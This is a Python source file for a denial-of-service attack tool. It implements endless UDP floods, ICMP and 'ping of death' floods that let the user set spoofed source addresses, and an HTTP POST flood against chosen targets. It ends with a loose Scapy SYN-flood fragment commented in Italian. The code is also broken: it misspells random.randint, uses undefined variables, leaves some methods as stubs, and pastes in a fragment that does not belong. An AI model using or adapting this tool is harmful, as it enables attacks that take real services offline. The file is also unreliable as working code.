import requests as res
import socket as sockk
import random
import time
import ping3
import platform

class VolumeBasedAttack:
    @staticmethod
    def udp_flooding(bye: bytes, vector: list, port: int):
        addr = tuple(vector)
        s = sockk.socket(sockk.AF_INET, sockk.SOCK_DGRAM)
        try: 
            while True:
                for i in addr:
                    s.sendto(bye, (i, port))
        except Exception as e:
            print(f'Error occurred: {e}')
        finally:
            s.close() 

    @staticmethod
    def icmp(vector: list, bye: bytes):
        bye = int(bye)
        if platform.system() == 'Linux':
            wifi = input("In Linux, you can also use wifi in ping mode, do you want to? (y/n) \n")
            if wifi.lower() == 'y':
                bytes_s = input("u can also send casual bytes, from 56 to 65500, u want to? (y/n) \n")
                if bytes_s == 'y': 
                    for i in vector:
                        bytes_size = random.randit(56, 65500)
                        ping3.verbose_ping(i, interface='wifi0', size=bytes_size, count=0, interval=0)
                else:
                    for i in vector:
                        ping3.verbose_ping(i, interface='wifi0', size=bye, count=0, interval=0)
            else:
                addre = input("You can also choose a source address, do you want to? (y/n) \n")
                if addre.lower() == 'y':
                    sources = input("Write the IP address(es): \n").split(" ")
                    bytes_s = input("u can also send casual bytes, from 56 to 65500, u want to? (y/n) \n")
                    if bytes_s == 'y': 
                        for i in vector:
                            for ad in sources:
                                bytes_size = random.randit(56, 65500)
                                ping3.verbose_ping(i, size=bytes_size, count=0, src_addr=ad, interval=0)
                    else:
                        for ad in sources:
                            ping3.verbose_ping(i, size=bye, count=0, src_addr=ad, interval=0)
                else:
                    for i in vector:
                        ping3.verbose_ping(i, size=bye, count=0, interval=0)

        elif platform.system() == 'Windows':
            response = input("You can choose a source address, do you want to? (y/n) \n")
            if response.lower() == 'y':
                sources = input("Write the IP address(es): \n").split(" ")
                bytes_s = input("u can also send casual bytes, from 56 to 65500, u want to? (y/n) \n")
                if bytes_s == 'y': 
                    print("ICMP attack with source address ", sources)
                    for i in vector:
                        bytes_size = random.randit(56, 65500)
                        for ad in sources:
                            ping3.verbose_ping(i, size=bytes_size, count=0, src_addr=ad, interval=0)
                else:
                    for i in vector:
                        for ad in sources:
                            ping3.verbose_ping(i, size=bye, count=0, src_addr=ad, interval=0)
            else:
                print("No source address selected.\n")
                for i in vector:
                    ping3.verbose_ping(i, size=bye, count=0, interval=0)

class ProtocolAttack:
    @staticmethod
    def pof(vector: list, bye: bytes):
        print("ping of death metod is a type of attack like icmp, but with more bytes, from 65501 to 65535")
        bye = int(bye)
        if platform.system() == 'Linux':
            wifi = input("In Linux, you can also use wifi in ping mode, do you want to? (y/n) \n")
            if wifi.lower() == 'y':
                bytes_s = input("u can also send casual bytes, from 56 to 65500, u want to? (y/n) \n")
                if bytes_s == 'y': 
                    print("ICMP attack with source address ", sources)
                    for i in vector:
                        bytes_size = random.randit(65500, 65535)
                        ping3.verbose_ping(i, interface='wifi0', size=bytes_size, count=0, interval=0)
                else:
                    for i in vector:
                        ping3.verbose_ping(i, interface='wifi0', size=bye, count=0, interval=0)
            else:
                addre = input("You can also choose a source address, do you want to? (y/n) \n")
                if addre.lower() == 'y':
                    sources = input("Write the IP address(es): \n").split(" ")
                    bytes_s = input("u can also send casual bytes, from 56 to 65500, u want to? (y/n) \n")
                    if bytes_s == 'y': 
                        print("ICMP attack with source address ", sources)
                        for i in vector:
                            bytes_size = random.randit(65500, 65535)
                            for ad in sources:
                                ping3.verbose_ping(i, size=bytes_size, count=0, src_addr=ad, interval=0)
                    else:
                        for i in vector:
                            for ad in sources:
                                ping3.verbose_ping(i, size=bytes_size, count=0, src_addr=ad, interval=0)
                                
                else:
                    for i in vector:
                        ping3.verbose_ping(i, size=bye, count=0, interval=0)

        elif platform.system() == 'Windows':
            response = input("You can choose a source address, do you want to? (y/n) \n")
            if response.lower() == 'y':
                sources = input("Write the IP address(es): \n").split(" ")
                bytes_s = input("u can also send casual bytes, from 65500 to 65535, u want to? (y/n) \n")
                if bytes_s == 'y': 
                    print("pof attack with source address ", sources)
                    for i in vector:
                        bytes_size = random.randit(65500, 65535)
                        for ad in sources:
                            ping3.verbose_ping(i, size=bytes_size, count=0, src_addr=ad, interval=0)
                else:
                    for i in vector:
                        for ad in sources:
                            ping3.verbose_ping(i, size=bye, count=0, src_addr=ad, interval=0)
            else:
                print("No source address selected.\n")
                bytes_s = input("u can also send casual bytes, from 65500 to 65535, u want to? (y/n) \n")
                if bytes_s == 'y': 
                    bytes_size = random.randit(65500, 65535)
                    for i in vector:
                        ping3.verbose_ping(i, size=bytes_size, count=0, interval=0)
                else:
                    for i in vector:
                        ping3.verbose_ping(i, size=bye, count=0, interval=0)

    @staticmethod
    def syn_flood(vector: list, bye: bytes, port: int):
        print(f"syn_flood attack on {vector} with {len(bye)} bytes")

class ApplicationLayerAttack:
    @staticmethod
    def post(vector: list, bye: bytes):
        print(f"POST attack on {vector} with {len(bye)} bytes")
        print("Using POST method to:", vector)
        print("You have 10 seconds to end the attack, press Ctrl+C or Ctrl+Z")
        time.sleep(10)
        while True:
            for target in vector:
                response = res.post(target, data=bye)
                print(response.text)

    @staticmethod
    def get(vector: list, bye: bytes):
        print(f"GET attack on {vector} with {len(bye)} bytes")





ip = IP(dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

    # Combina gli strati
    pkt = ip/tcp

    print(f"Iniziando SYN flood su {target_ip}:{target_port}")

    # Invia pacchetti in loop infinito
    send(pkt, loop=1, verbose=0)